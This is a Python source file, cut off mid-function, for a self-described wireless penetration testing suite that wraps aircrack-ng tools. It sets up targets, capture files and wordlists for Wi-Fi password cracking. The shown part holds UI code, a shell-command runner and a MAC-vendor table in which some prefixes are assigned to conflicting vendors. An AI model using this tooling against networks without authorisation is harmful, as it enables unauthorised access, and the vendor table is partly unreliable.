#!/usr/bin/env python3
"""
WiFi Master - Enhanced Version
A Python-based automation wrapper for the aircrack-ng suite
Developer: Sadiq Garba Ibrahim
Organization: BlueCloud AI
Contact: sadeeqsgi@icloud.com | bluecloudai.online
"""

import os
import sys
import time
import signal
import subprocess
import json
import re
from datetime import datetime
from pathlib import Path
import threading
import select
import urllib.request
import hashlib
import random
import string
import readline  # For better input handling

class WiFiMaster:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.bssid = None
        self.channel = None
        self.client = None
        self.cap_file = None
        self.wordlist = None
        self.capture_dir = "captures"
        self.wordlist_dir = "wordlists"
        self.config_file = "wifi_master_config.json"
        self.cracking_process = None
        self.capture_process = None
        self.scan_process = None
        self.scan_active = False
        self.scan_stop_event = threading.Event()
        
        # Colors for terminal output
        self.COLORS = {
            'HEADER': '\033[95m',
            'BLUE': '\033[94m',
            'CYAN': '\033[96m',
            'GREEN': '\033[92m',
            'YELLOW': '\033[93m',
            'RED': '\033[91m',
            'ENDC': '\033[0m',
            'BOLD': '\033[1m',
            'WHITE': '\033[97m',
            'MAGENTA': '\033[35m'
        }
        
        # UI Elements
        self.UI = {
            'top_left': '╔',
            'top_right': '╗',
            'bottom_left': '╚',
            'bottom_right': '╝',
            'horizontal': '═',
            'vertical': '║',
            'left_middle': '╠',
            'right_middle': '╣',
            'top_middle': '╦',
            'bottom_middle': '╩',
            'cross': '╬'
        }
        
        # Create necessary directories
        Path(self.capture_dir).mkdir(exist_ok=True)
        Path(self.wordlist_dir).mkdir(exist_ok=True)
        
        # Load configuration
        self.load_config()
        
        # Set up signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_header(self):
        """Print application header"""
        self.clear_screen()
        width = 70
        
        print(self.COLORS['BLUE'] + self.UI['top_left'] + self.UI['horizontal']*(width-2) + self.UI['top_right'] + self.COLORS['ENDC'])
        
        title = "WiFi MASTER v2.0"
        subtitle = "Advanced Wireless Penetration Testing Suite"
        developer = "Developer: Sadiq Garba Ibrahim"
        org = "Organization: BlueCloud AI"
        
        print(self.COLORS['BLUE'] + self.UI['vertical'] + self.COLORS['ENDC'], end='')
        print(self.COLORS['CYAN'] + self.COLORS['BOLD'] + title.center(width-2) + self.COLORS['ENDC'], end='')
        print(self.COLORS['BLUE'] + self.UI['vertical'] + self.COLORS['ENDC'])
        
        print(self.COLORS['BLUE'] + self.UI['vertical'] + self.COLORS['ENDC'], end='')
        print(self.COLORS['WHITE'] + subtitle.center(width-2) + self.COLORS['ENDC'], end='')
        print(self.COLORS['BLUE'] + self.UI['vertical'] + self.COLORS['ENDC'])
        
        print(self.COLORS['BLUE'] + self.UI['left_middle'] + self.UI['horizontal']*(width-2) + self.UI['right_middle'] + self.COLORS['ENDC'])
        
        print(self.COLORS['BLUE'] + self.UI['vertical'] + self.COLORS['ENDC'], end='')
        print(self.COLORS['MAGENTA'] + developer.center(width-2) + self.COLORS['ENDC'], end='')
        print(self.COLORS['BLUE'] + self.UI['vertical'] + self.COLORS['ENDC'])
        
        print(self.COLORS['BLUE'] + self.UI['vertical'] + self.COLORS['ENDC'], end='')
        print(self.COLORS['MAGENTA'] + org.center(width-2) + self.COLORS['ENDC'], end='')
        print(self.COLORS['BLUE'] + self.UI['vertical'] + self.COLORS['ENDC'])
        
        print(self.COLORS['BLUE'] + self.UI['bottom_left'] + self.UI['horizontal']*(width-2) + self.UI['bottom_right'] + self.COLORS['ENDC'])
        print()
    
    def print_box(self, title, content_lines, color='CYAN', width=70):
        """Print a box with title and content"""
        print(self.COLORS[color] + self.UI['top_left'] + self.UI['horizontal']*(width-2) + self.UI['top_right'] + self.COLORS['ENDC'])
        
        # Title
        title_display = f" {title} "
        print(self.COLORS[color] + self.UI['vertical'] + self.COLORS['ENDC'], end='')
        print(self.COLORS[color] + self.COLORS['BOLD'] + title_display.center(width-2) + self.COLORS['ENDC'], end='')
        print(self.COLORS[color] + self.UI['vertical'] + self.COLORS['ENDC'])
        
        print(self.COLORS[color] + self.UI['left_middle'] + self.UI['horizontal']*(width-2) + self.UI['right_middle'] + self.COLORS['ENDC'])
        
        # Content
        for line in content_lines:
            print(self.COLORS[color] + self.UI['vertical'] + self.COLORS['ENDC'], end='')
            print(self.COLORS['WHITE'] + line.ljust(width-2) + self.COLORS['ENDC'], end='')
            print(self.COLORS[color] + self.UI['vertical'] + self.COLORS['ENDC'])
        
        print(self.COLORS[color] + self.UI['bottom_left'] + self.UI['horizontal']*(width-2) + self.UI['bottom_right'] + self.COLORS['ENDC'])
        print()
    
    def print_status(self):
        """Print current status panel"""
        width = 70
        status_lines = []
        
        if self.interface:
            status_lines.append(f"📶 Interface: {self.COLORS['GREEN']}{self.interface}{self.COLORS['ENDC']}")
        else:
            status_lines.append(f"📶 Interface: {self.COLORS['YELLOW']}Not Selected{self.COLORS['ENDC']}")
        
        if self.monitor_interface:
            mode = f"{self.COLORS['GREEN']}Monitor Mode{self.COLORS['ENDC']}"
            status_lines.append(f"🔄 Mode: {mode} ({self.monitor_interface})")
        else:
            status_lines.append(f"🔄 Mode: {self.COLORS['YELLOW']}Managed Mode{self.COLORS['ENDC']}")
        
        if self.bssid:
            status_lines.append(f"🎯 Target: {self.COLORS['CYAN']}{self.bssid[:8]}...{self.COLORS['ENDC']}")
        else:
            status_lines.append(f"🎯 Target: {self.COLORS['YELLOW']}Not Selected{self.COLORS['ENDC']}")
        
        if self.wordlist:
            wl_name = os.path.basename(self.wordlist)
            status_lines.append(f"📖 Wordlist: {self.COLORS['CYAN']}{wl_name}{self.COLORS['ENDC']}")
        else:
            status_lines.append(f"📖 Wordlist: {self.COLORS['YELLOW']}Not Selected{self.COLORS['ENDC']}")
        
        # Network Manager status
        nm_result = self.run_command("systemctl is-active NetworkManager", capture_output=True)
        if nm_result and "active" in nm_result.stdout:
            status_lines.append(f"🌐 Network Manager: {self.COLORS['GREEN']}Active{self.COLORS['ENDC']}")
        else:
            status_lines.append(f"🌐 Network Manager: {self.COLORS['RED']}Inactive{self.COLORS['ENDC']}")
        
        self.print_box("CURRENT STATUS", status_lines, 'BLUE', width)
    
    def color_print(self, text, color='ENDC', bold=False, end='\n'):
        """Print colored text to terminal"""
        color_code = self.COLORS.get(color, self.COLORS['ENDC'])
        bold_code = self.COLORS['BOLD'] if bold else ''
        print(f"{bold_code}{color_code}{text}{self.COLORS['ENDC']}", end=end)
    
    def load_config(self):
        """Load configuration from file"""
        config_path = Path(self.config_file)
        if config_path.exists():
            try:
                with open(config_path, 'r') as f:
                    config = json.load(f)
                    self.interface = config.get('interface')
                    self.wordlist = config.get('wordlist')
            except:
                self.color_print("Could not load config file", 'YELLOW')
    
    def save_config(self):
        """Save configuration to file"""
        config = {
            'interface': self.interface,
            'wordlist': self.wordlist,
            'last_updated': datetime.now().isoformat()
        }
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=4)
        except:
            self.color_print("Could not save config file", 'YELLOW')
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        if self.scan_active:
            self.color_print("\n\n[!] Scan interrupted by user", 'YELLOW')
            self.scan_stop_event.set()
            self.scan_active = False
        else:
            self.color_print("\n\n[!] Interrupt received. Cleaning up...", 'YELLOW')
            self.cleanup()
            sys.exit(0)
    
    def check_root(self):
        """Check if running with sudo/root privileges"""
        if os.geteuid() != 0:
            self.print_header()
            self.color_print("\n[!] WiFi Master requires root privileges!", 'RED', True)
            self.color_print("[!] Please run with: sudo python3 wifi_master.py", 'YELLOW')
            sys.exit(1)
        self.color_print("[✓] Root privileges confirmed", 'GREEN')
    
    def run_command(self, command, background=False, capture_output=True):
        """Run a shell command with error handling"""
        try:
            if background:
                if capture_output:
                    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                          stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
                else:
                    return subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
            else:
                result = subprocess.run(command, shell=True, capture_output=capture_output, 
                                      text=True, timeout=30)
                return result
        except subprocess.TimeoutExpired:
            self.color_print(f"[!] Command timed out: {command}", 'YELLOW')
            return None
        except Exception as e:
            self.color_print(f"[!] Error executing command: {e}", 'RED')
            return None
    
    def get_manufacturer(self, mac_address):
        """Get manufacturer from MAC address OUI"""
        oui_prefix = mac_address[:8].upper()
        
        # Common OUI prefixes (expanded)
        oui_db = {
            "00:0C:29": "VMware", "00:50:56": "VMware",
            "00:1A:2B": "Cisco", "00:1C:B3": "Cisco", "00:24:BE": "Cisco",
            "00:26:0B": "Apple", "00:03:93": "Apple", "00:11:24": "Apple",
            "00:1B:63": "Apple", "00:1D:4F": "Apple", "00:1E:52": "Apple",
            "00:1F:5B": "Apple", "00:1F:F3": "Apple", "00:22:41": "Apple",
            "00:23:12": "Apple", "00:23:32": "Apple", "00:23:6C": "Apple",
            "00:23:DF": "Apple", "00:24:36": "Apple", "00:24:A5": "Apple",
            "00:25:00": "Apple", "00:25:4B": "Apple", "00:25:BC": "Apple",
            "00:26:08": "Apple", "00:26:4A": "Apple", "00:26:B0": "Apple",
            "00:26:BB": "Apple", "00:26:C7": "Apple", "00:30:65": "Apple",
            "00:3A:99": "Apple", "00:3E:E1": "Apple", "00:56:CD": "Apple",
            "00:6D:52": "Apple", "00:88:65": "Apple", "00:A0:40": "Apple",
            "00:C0:41": "Apple", "00:C6:10": "Apple", "04:0C:CE": "Apple",
            "04:15:52": "Apple", "04:1E:64": "Apple", "04:26:65": "Apple",
            "04:48:9A": "Apple", "04:4B:ED": "Apple", "04:52:F3": "Apple",
            "04:54:53": "Apple", "04:69:F8": "Apple", "04:D3:CF": "Apple",
            "04:D4:C4": "Apple", "04:DB:56": "Apple", "04:E5:36": "Apple",
            "04:F1:3E": "Apple", "08:00:07": "Apple", "08:66:98": "Apple",
            "08:6D:41": "Apple", "08:70:45": "Apple", "08:74:02": "Apple",
            "08:87:C7": "Apple", "0C:3E:9F": "Apple", "0C:4D:E9": "Apple",
            "0C:51:01": "Apple", "0C:74:C2": "Apple", "0C:77:1A": "Apple",
            "0C:BC:9F": "Apple", "0C:D7:46": "Apple", "10:1C:0C": "Apple",
            "10:40:F3": "Apple", "10:93:E9": "Apple", "10:9A:DD": "Apple",
            "10:DD:B1": "Apple", "14:10:9F": "Apple", "14:36:C6": "Apple",
            "14:5A:05": "Apple", "14:8F:C6": "Apple", "14:99:E2": "Apple",
            "18:20:32": "Apple", "18:34:51": "Apple", "18:65:90": "Apple",
            "18:81:0E": "Apple", "18:9E:FC": "Apple", "18:E7:F4": "Apple",
            "18:F6:43": "Apple", "1C:1A:C0": "Apple", "1C:5A:3E": "Apple",
            "1C:5A:6B": "Apple", "1C:91:9D": "Apple", "1C:AB:A7": "Apple",
            "20:3C:AE": "Apple", "20:7D:74": "Apple", "20:A2:E4": "Apple",
            "20:AB:37": "Apple", "20:C9:D0": "Apple", "24:1E:EB": "Apple",
            "24:5B:A7": "Apple", "24:A0:74": "Apple", "24:AB:81": "Apple",
            "24:E3:14": "Apple", "28:0B:5C": "Apple", "28:37:37": "Apple",
            "28:5A:EB": "Apple", "28:6A:B8": "Apple", "28:6A:BA": "Apple",
            "28:CF:DA": "Apple", "28:CF:E9": "Apple", "28:E1:4C": "Apple",
            "28:E7:CF": "Apple", "2C:1F:23": "Apple", "2C:33:61": "Apple",
            "2C:B4:3A": "Apple", "2C:BE:08": "Apple", "2C:F0:A2": "Apple",
            "2C:F0:EE": "Apple", "30:10:E4": "Apple", "30:35:AD": "Apple",
            "30:F7:C5": "Apple", "34:12:98": "Apple", "34:15:9E": "Apple",
            "34:23:BA": "Apple", "34:36:3B": "Apple", "34:42:62": "Apple",
            "34:4D:F7": "Apple", "34:51:C9": "Apple", "34:C0:59": "Apple",
            "34:E2:FD": "Apple", "38:0F:4A": "Apple", "38:48:4C": "Apple",
            "38:71:DE": "Apple", "38:B5:4D": "Apple", "38:C9:86": "Apple",
            "3C:07:54": "Apple", "3C:15:C2": "Apple", "3C:AB:8E": "Apple",
            "3C:D0:F8": "Apple", "3C:E0:72": "Apple", "40:30:04": "Apple",
            "40:33:1A": "Apple", "40:3C:FC": "Apple", "40:6C:8F": "Apple",
            "40:A6:D9": "Apple", "40:B3:95": "Apple", "44:2A:60": "Apple",
            "44:4C:0C": "Apple", "44:D8:84": "Apple", "44:FB:42": "Apple",
            "48:60:BC": "Apple", "48:74:6E": "Apple", "4C:7C:5F": "Apple",
            "4C:8D:79": "Apple", "4C:B1:99": "Apple", "50:EA:D6": "Apple",
            "54:26:96": "Apple", "54:72:4F": "Apple", "54:9F:13": "Apple",
            "54:E4:3A": "Apple", "58:1F:AA": "Apple", "58:40:4E": "Apple",
            "58:55:CA": "Apple", "58:7F:57": "Apple", "58:B0:35": "Apple",
            "58:FB:84": "Apple", "5C:59:48": "Apple", "5C:95:AE": "Apple",
            "5C:96:9D": "Apple", "5C:97:F3": "Apple", "5C:F9:38": "Apple",
            "60:03:08": "Apple", "60:33:4B": "Apple", "60:69:44": "Apple",
            "60:92:17": "Apple", "60:C5:47": "Apple", "60:D9:C7": "Apple",
            "60:FB:42": "Apple", "64:20:0C": "Apple", "64:76:BA": "Apple",
            "64:A3:CB": "Apple", "64:B9:E8": "Apple", "64:E6:82": "Apple",
            "68:09:27": "Apple", "68:5B:35": "Apple", "68:96:7B": "Apple",
            "68:9C:70": "Apple", "68:A8:6D": "Apple", "68:AE:20": "Apple",
            "68:D9:3C": "Apple", "6C:19:8F": "Apple", "6C:3E:6D": "Apple",
            "6C:40:08": "Apple", "6C:70:9F": "Apple", "6C:94:F8": "Apple",
            "70:11:24": "Apple", "70:56:81": "Apple", "70:73:CB": "Apple",
            "70:81:EB": "Apple", "70:DE:E2": "Apple", "70:EC:E4": "Apple",
            "74:1B:B2": "Apple", "74:81:14": "Apple", "74:E1:B6": "Apple",
            "78:31:C1": "Apple", "78:3A:84": "Apple", "78:4F:43": "Apple",
            "78:7B:8A": "Apple", "78:9F:70": "Apple", "78:A3:E4": "Apple",
            "78:CA:39": "Apple", "78:FD:94": "Apple", "7C:11:BE": "Apple",
            "7C:6D:62": "Apple", "7C:C3:A1": "Apple", "7C:C5:37": "Apple",
            "7C:D1:C3": "Apple", "7C:F0:5F": "Apple", "7C:FA:DF": "Apple",
            "80:00:6E": "Apple", "80:49:71": "Apple", "80:92:9F": "Apple",
            "80:BE:05": "Apple", "80:D6:05": "Apple", "80:EA:96": "Apple",
            "84:29:99": "Apple", "84:38:35": "Apple", "84:85:06": "Apple",
            "84:8E:0C": "Apple", "84:8F:69": "Apple", "84:B1:53": "Apple",
            "84:FC:FE": "Apple", "88:1F:A1": "Apple", "88:53:95": "Apple",
            "88:63:DF": "Apple", "88:C6:63": "Apple", "88:CB:87": "Apple",
            "8C:00:6D": "Apple", "8C:2D:AA": "Apple", "8C:58:77": "Apple",
            "8C:7B:9D": "Apple", "8C:7C:92": "Apple", "8C:FA:BA": "Apple",
            "90:27:E4": "Apple", "90:60:F1": "Apple", "90:72:40": "Apple",
            "90:84:0D": "Apple", "90:B2:1F": "Apple", "90:B9:31": "Apple",
            "90:C1:C6": "Apple", "94:94:26": "Apple", "98:01:A7": "Apple",
            "98:03:D8": "Apple", "98:0C:82": "Apple", "98:5A:EB": "Apple",
            "98:B8:E3": "Apple", "98:D6:BB": "Apple", "98:E0:D9": "Apple",
            "98:FE:94": "Apple", "9C:04:EB": "Apple", "9C:20:7B": "Apple",
            "9C:35:EB": "Apple", "9C:4F:DA": "Apple", "9C:84:BF": "Apple",
            "9C:F3:87": "Apple", "9C:F4:8E": "Apple", "9C:FC:01": "Apple",
            "A0:18:28": "Apple", "A0:99:9B": "Apple", "A0:ED:CD": "Apple",
            "A4:31:35": "Apple", "A4:5E:60": "Apple", "A4:67:06": "Apple",
            "A4:83:E7": "Apple", "A4:B1:97": "Apple", "A4:C3:61": "Apple",
            "A4:D1:8C": "Apple", "A4:F1:E8": "Apple", "A8:20:66": "Apple",
            "A8:86:DD": "Apple", "A8:88:08": "Apple", "A8:96:8A": "Apple",
            "A8:BB:CF": "Apple", "A8:FA:D8": "Apple", "A8:FB:70": "Apple",
            "AC:29:3A": "Apple", "AC:3C:0B": "Apple", "AC:61:EA": "Apple",
            "AC:7F:3E": "Apple", "AC:87:A3": "Apple", "AC:BC:32": "Apple",
            "AC:CF:5C": "Apple", "AC:FD:EC": "Apple", "B0:34:95": "Apple",
            "B0:65:BD": "Apple", "B0:9F:BA": "Apple", "B4:18:D1": "Apple",
            "B4:8B:19": "Apple", "B8:09:8A": "Apple", "B8:17:C2": "Apple",
            "B8:44:D9": "Apple", "B8:8D:12": "Apple", "B8:C7:5D": "Apple",
            "B8:E8:56": "Apple", "B8:F6:B1": "Apple", "BC:3B:AF": "Apple",
            "BC:4C:C4": "Apple", "BC:52:B7": "Apple", "BC:54:51": "Apple",
            "BC:67:78": "Apple", "BC:6C:21": "Apple", "BC:92:6B": "Apple",
            "BC:A8:A6": "Apple", "C0:63:94": "Apple", "C0:84:7A": "Apple",
            "C0:9F:42": "Apple", "C0:CE:CD": "Apple", "C0:F2:FB": "Apple",
            "C4:2C:03": "Apple", "C4:2F:90": "Apple", "C8:1E:E7": "Apple",
            "C8:33:4B": "Apple", "C8:69:CD": "Apple", "C8:6F:1D": "Apple",
            "C8:85:50": "Apple", "C8:9C:1D": "Apple", "C8:B5:B7": "Apple",
            "C8:BC:C8": "Apple", "C8:D0:83": "Apple", "C8:E0:EB": "Apple",
            "CC:08:E0": "Apple", "CC:20:E8": "Apple", "CC:29:F5": "Apple",
            "CC:44:63": "Apple", "CC:78:5F": "Apple", "CC:C7:60": "Apple",
            "D0:03:4B": "Apple", "D0:23:DB": "Apple", "D0:25:98": "Apple",
            "D0:33:11": "Apple", "D0:81:7A": "Apple", "D0:A6:37": "Apple",
            "D0:C5:F3": "Apple", "D0:E1:40": "Apple", "D4:61:9D": "Apple",
            "D4:F0:57": "Apple", "D8:00:4D": "Apple", "D8:30:62": "Apple",
            "D8:96:95": "Apple", "D8:9E:3F": "Apple", "D8:A2:5E": "Apple",
            "D8:BB:2C": "Apple", "D8:CF:9C": "Apple", "DC:2B:2A": "Apple",
            "DC:2B:61": "Apple", "DC:37:14": "Apple", "DC:41:5F": "Apple",
            "DC:86:D8": "Apple", "DC:9B:9C": "Apple", "E0:66:78": "Apple",
            "E0:AC:CB": "Apple", "E0:B5:2D": "Apple", "E0:B9:BA": "Apple",
            "E0:C9:7A": "Apple", "E0:F5:C6": "Apple", "E0:F8:47": "Apple",
            "E4:25:E7": "Apple", "E4:8B:7F": "Apple", "E4:98:D6": "Apple",
            "E4:9A:79": "Apple", "E4:C6:3D": "Apple", "E4:CE:8F": "Apple",
            "E8:04:0B": "Apple", "E8:06:88": "Apple", "E8:80:2E": "Apple",
            "E8:8D:28": "Apple", "EC:35:86": "Apple", "EC:85:2F": "Apple",
            "F0:18:98": "Apple", "F0:24:75": "Apple", "F0:76:1C": "Apple",
            "F0:99:BF": "Apple", "F0:B0:E7": "Apple", "F0:B4:79": "Apple",
            "F0:C1:F1": "Apple", "F0:CB:A1": "Apple", "F0:D1:A9": "Apple",
            "F0:DB:E2": "Apple", "F0:DB:F8": "Apple", "F0:F6:1C": "Apple",
            "F4:1B:A1": "Apple", "F4:31:C3": "Apple", "F4:37:B7": "Apple",
            "F4:F1:5A": "Apple", "F4:F9:51": "Apple", "F8:03:77": "Apple",
            "F8:27:93": "Apple", "F8:95:EA": "Apple", "FC:25:3F": "Apple",
            "FC:FC:48": "Apple", "00:26:4A": "TP-Link", "00:1D:0F": "TP-Link",
            "00:23:CD": "TP-Link", "00:08:22": "TP-Link", "14:CC:20": "TP-Link",
            "1C:FA:68": "TP-Link", "30:B5:C2": "TP-Link", "50:3E:AA": "TP-Link",
            "64:70:02": "TP-Link", "6C:E8:73": "TP-Link", "74:EA:3A": "TP-Link",
            "84:D6:D0": "TP-Link", "A0:F3:51": "TP-Link", "C0:4A:00": "TP-Link",
            "EC:08:6B": "TP-Link", "F4:EC:38": "TP-Link", "00:14:6C": "Netgear",
            "00:1B:2F": "Netgear", "00:24:B2": "Netgear", "00:26:F2": "Netgear",
            "00:1E:2A": "Netgear", "20:E5:2A": "Netgear", "2C:B0:5D": "Netgear",
            "44:94:FC": "Netgear", "6C:B0:CE": "Netgear", "98:3B:8F": "Netgear",
            "00:22:3F": "ASUS", "00:1D:60": "ASUS", "00:0C:43": "ASUS",
            "00:1A:92": "ASUS", "00:1B:FC": "ASUS", "10:BF:48": "ASUS",
            "20:CF:30": "ASUS", "28:31:52": "ASUS", "60:A4:4C": "ASUS",
            "74:D0:2B": "ASUS", "AC:22:0B": "ASUS", "BC:AE:C5": "ASUS",
            "00:11:95": "Buffalo", "00:1D:73": "D-Link", "00:1C:F0": "D-Link",
            "00:1B:11": "D-Link", "00:1A:6B": "Belkin", "00:17:3F": "Belkin",
            "00:14:A5": "Belkin", "00:18:4D": "Samsung", "00:12:47": "Samsung",
            "00:1E:7D": "Samsung", "00:23:39": "Samsung", "00:26:5E": "Samsung",
            "00:07:AB": "Intel", "00:0D:3A": "Intel", "00:13:02": "Intel",
            "00:13:CE": "Intel", "00:16:6F": "Intel", "00:19:D1": "Intel",
            "00:1C:BF": "Intel", "00:21:6A": "Intel", "00:26:C7": "Intel",
            "00:16:6F": "Intel", "00:1C:C0": "Intel", "00:1D:E0": "Intel",
            "00:1E:64": "Intel", "00:1E:65": "Intel", "00:1F:3C": "Intel",
            "00:21:5C": "Intel", "00:22:FA": "Intel", "00:24:D6": "Intel",
            "00:26:C7": "Intel", "08:11:96": "Intel", "08:3E:8E": "Intel",
            "08:9E:01": "Intel", "0C:8B:FD": "Intel", "10:4A:7D": "Intel",
            "14:1A:A3": "Intel", "18:3D:A2": "Intel", "1C:65:9D": "Intel",
            "1C:7B:21": "Intel", "20:AA:4B": "Intel", "24:77:03": "Intel",
            "28:18:78": "Intel", "28:6F:7F": "Intel", "2C:6E:85": "Intel",
            "2C:90:5A": "Intel", "30:59:B7": "Intel", "34:13:E8": "Intel",
            "38:59:F9": "Intel", "3C:A9:F4": "Intel", "40:16:7E": "Intel",
            "44:03:2C": "Intel", "48:45:20": "Intel", "4C:34:88": "Intel",
            "4C:80:93": "Intel", "50:1A:C5": "Intel", "54:EA:A8": "Intel",
            "5C:51:88": "Intel", "60:57:18": "Intel", "60:67:20": "Intel",
            "64:5A:04": "Intel", "64:80:99": "Intel", "68:5B:35": "Intel",
            "6C:88:14": "Intel", "70:56:81": "Intel", "74:E5:0B": "Intel",
            "78:92:9C": "Intel", "78:AC:C0": "Intel", "7C:67:A2": "Intel",
            "7C:7D:3D": "Intel", "80:86:F2": "Intel", "84:A6:C8": "Intel",
            "88:53:95": "Intel", "8C:70:5A": "Intel", "90:E7:C4": "Intel",
            "94:65:9C": "Intel", "98:4B:E1": "Intel", "9C:B6:D0": "Intel",
            "A0:88:69": "Intel", "A0:88:B4": "Intel", "A4:34:D9": "Intel",
            "A4:C3:61": "Intel", "AC:72:89": "Intel", "B0:48:7A": "Intel",
            "B4:AE:2B": "Intel", "B8:8A:60": "Intel", "BC:77:37": "Intel",
            "C0:9F:05": "Intel", "C4:85:08": "Intel", "C8:F6:50": "Intel",
            "CC:3D:82": "Intel", "D0:57:7C": "Intel", "D4:6A:A8": "Intel",
            "D8:FC:93": "Intel", "DC:53:60": "Intel", "E0:94:67": "Intel",
            "E4:D3:2A": "Intel", "E8:2A:EA": "Intel", "EC:D0:9F": "Intel",
            "F0:1C:2D": "Intel", "F4:8E:38": "Intel", "F8:16:54": "Intel",
            "FC:F1:52": "Intel", "00:50:F2": "Microsoft", "00:12:5A": "Microsoft",
            "00:15:5D": "Microsoft", "00:17:FA": "Microsoft", "00:1D:D8": "Microsoft",
            "00:22:48": "Microsoft", "00:25:AE": "Microsoft", "00:50:F1": "Microsoft",
            "04:F7:E4": "Microsoft", "10:2F:6B": "Microsoft", "14:9F:3C": "Microsoft",
            "1C:83:41": "Microsoft", "20:62:74": "Microsoft", "28:18:78": "Microsoft",
            "34:F3:9A": "Microsoft", "40:F0:2F": "Microsoft", "5C:E8:EB": "Microsoft",
            "6C:5A:B5": "Microsoft", "74:5E:1C": "Microsoft", "78:E4:00": "Microsoft",
            "80:56:F2": "Microsoft", "84:38:35": "Microsoft", "A8:9F:BA": "Microsoft",
            "B0:48:7A": "Microsoft", "BC:30:5B": "Microsoft", "C8:1F:66": "Microsoft",
            "D8:50:E6": "Microsoft", "E4:D5:3D": "Microsoft", "F0:1B:6C": "Microsoft",
            "F4:8E:38": "Microsoft", "FC:48:EF": "Microsoft", "00:19:7D": "Huawei",
            "00:25:9E": "Huawei", "00:46:4B": "Huawei", "00:66:4B": "Huawei",
            "00:E0:FC": "Huawei", "04:C0:6F": "Huawei", "0C:37:DC": "Huawei",
            "0C:96:BF": "Huawei", "10:C6:1F": "Huawei", "14:89:FD": "Huawei",
            "18:26:66": "Huawei", "1C:1D:67": "Huawei", "20:08:ED": "Huawei",
            "20:2B:C1": "Huawei", "28:6E:D4": "Huawei", "28:E3:1F": "Huawei",
            "2C:AB:00": "Huawei", "30:87:30": "Huawei", "30:D1:7E": "Huawei",
            "34:6B:D3": "Huawei", "34:CE:00": "Huawei", "38:E2:DD": "Huawei",
            "3C:E5:A6": "Huawei", "40:4D:8E": "Huawei", "44:6A:2E": "Huawei",
            "48:86:E8": "Huawei", "4C:1F:CC": "Huawei", "50:9F:27": "Huawei",
            "54:89:98": "Huawei", "5C:B3:95": "Huawei", "60:DE:44": "Huawei",
            "68:A0:3E": "Huawei", "6C:AC:60": "Huawei", "70:72:3C": "Huawei",
            "74:25:8A": "Huawei", "78:1D:BA": "Huawei", "7C:1D:D9": "Huawei",
            "80:FB:06": "Huawei", "84:A8:E4": "Huawei", "88:E8:03": "Huawei",
            "8C:EC:4B": "Huawei", "90:4C:E6": "Huawei", "94:FE:22": "Huawei",
            "98:BC:57": "Huawei", "9C:D3:5B": "Huawei", "A0:4E:04": "Huawei",
            "A4:99:47": "Huawei", "A8:26:D9": "Huawei", "AC:E2:15": "Huawei",
            "B0:5B:67": "Huawei", "B4:0B:44": "Huawei", "B8:BC:5B": "Huawei",
            "C0:35:BD": "Huawei", "C4:50:06": "Huawei", "C8:64:C7": "Huawei",
            "CC:53:B5": "Huawei", "D0:7E:B5": "Huawei", "D0:C7:C0": "Huawei",
            "D4:6A:91": "Huawei", "D8:49:0B": "Huawei", "DC:D2:FC": "Huawei",
            "E0:24:7F": "Huawei", "E4:32:CB": "Huawei", "E8:BD:D1": "Huawei",
            "EC:23:3D": "Huawei", "F0:25:B7": "Huawei", "F4:55:9C": "Huawei",
            "F8:3D:FF": "Huawei", "FC:48:EF": "Huawei", "00:13:E8": "Sony",
            "00:1A:80": "Sony", "00:1B:59": "Sony", "00:1F:E4": "Sony",
            "00:24:BE": "Sony", "00:26:5D": "Sony", "00:AB:00": "Sony",
            "04:C2:3E": "Sony", "0C:FE:45": "Sony", "10:2A:B3": "Sony",
            "14:A7:8B": "Sony", "18:00:2D": "Sony", "1C:7B:21": "Sony",
            "20:54:76": "Sony", "24:21:AB": "Sony", "28:BA:B5": "Sony",
            "2C:AE:2B": "Sony", "30:17:C8": "Sony", "34:CE:00": "Sony",
            "38:71:DE": "Sony", "3C:07:71": "Sony", "40:F4:EC": "Sony",
            "44:74:6C": "Sony", "48:A9:D2": "Sony", "4C:21:D0": "Sony",
            "54:42:49": "Sony", "58:48:22": "Sony", "5C:0A:5B": "Sony",
            "60:3E:7B": "Sony", "64:B3:10": "Sony", "68:76:4F": "Sony",
            "6C:23:B9": "Sony", "70:9E:29": "Sony", "74:45:8A": "Sony",
            "78:59:5E": "Sony", "7C:03:4C": "Sony", "80:46:CF": "Sony",
            "84:00:D2": "Sony", "88:AD:43": "Sony", "8C:7C:92": "Sony",
            "90:C1:C6": "Sony", "94:CE:2C": "Sony", "98:F1:70": "Sony",
            "9C:02:98": "Sony", "A0:E4:53": "Sony", "A4:AA:CC": "Sony",
            "AC:9B:0A": "Sony", "B0:FC:0D": "Sony", "B4:52:7D": "Sony",
            "B8:F9:34": "Sony", "BC:6E:64": "Sony", "C0:84:7A": "Sony",
            "C4:3A:BE": "Sony", "C8:85:50": "Sony", "CC:CE:1E": "Sony",
            "D0:51:62": "Sony", "D0:73:D5": "Sony", "D4:F4:6F": "Sony",
            "D8:8F:76": "Sony", "DC:0C:5C": "Sony", "E0:63:E5": "Sony",
            "E4:12:1D": "Sony", "E8:B2:AC": "Sony", "EC:E0:9B": "Sony",
            "F0:72:8C": "Sony", "F4:0F:24": "Sony", "F8:D0:AC": "Sony",
            "FC:0F:E6": "Sony", "00:1B:63": "Google", "00:1A:11": "Google",
            "24:86:9C": "Google", "3C:5A:B4": "Google", "40:F4:EC": "Google",
            "6C:29:95": "Google", "78:88:6D": "Google", "84:7A:88": "Google",
            "8C:85:90": "Google", "A4:77:33": "Google", "AC:D1:B8": "Google",
            "D8:EB:97": "Google", "E4:F8:EF": "Google", "F8:8F:CA": "Google",
        }
        
        return oui_db.get(oui_prefix, "Unknown")
    
    def check_dependencies(self):
        """Check if required tools are installed"""
        required_tools = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'iwconfig']
        
        self.color_print("\n[~] Checking dependencies...", 'CYAN')
        
        missing_tools = []
        for tool in required_tools:
            result = self.run_command(f"which {tool}", capture_output=True)
            if result and result.returncode == 0:
                self.color_print(f"  [✓] {tool}", 'GREEN')
            else:
                self.color_print(f"  [✗] {tool}", 'RED')
                missing_tools.append(tool)
        
        if missing_tools:
